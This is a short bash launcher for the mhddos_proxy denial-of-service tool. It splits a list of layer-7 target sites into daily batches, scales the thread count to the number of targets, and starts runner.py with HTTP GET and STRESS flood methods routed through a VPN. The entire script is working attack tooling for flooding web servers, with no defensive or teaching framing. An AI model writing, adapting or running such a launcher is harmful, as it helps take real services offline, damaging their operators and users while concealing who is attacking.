#!/usr/bin/env bash

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

calc() { awk "BEGIN{ printf \"%.2f\n\", $* }"; }

BASE_DIR="$(dirname -- "$(readlink -f "${BASH_SOURCE}")")"
BASE_FILE='l7_get-stress.lst'
CURRENT_DAY=$(printf %02d `date +%d`)
DAYS_IN_MONTH=$(cal |egrep -v [a-z] |wc -w)
LINES=$(cat $BASE_DIR/../$BASE_FILE | wc -l)
LINES_PER_PART=$(echo "$(calc "$LINES/$DAYS_IN_MONTH")" | python3 -c "print(round(float(input())))")
TARGETS_FILE="$BASE_DIR/../$BASE_FILE"
TARGETS_FILE_SPLIT="$BASE_DIR/../$BASE_FILE.$CURRENT_DAY"
((THREADS=$LINES*(2**4)))

split --numeric-suffixes=1 -l $LINES_PER_PART $TARGETS_FILE "$TARGETS_FILE."

python3 runner.py \
  --config "$TARGETS_FILE_SPLIT" \
  --http-methods GET STRESS \
  --lang en \
  --threads "$THREADS" \
  --vpn
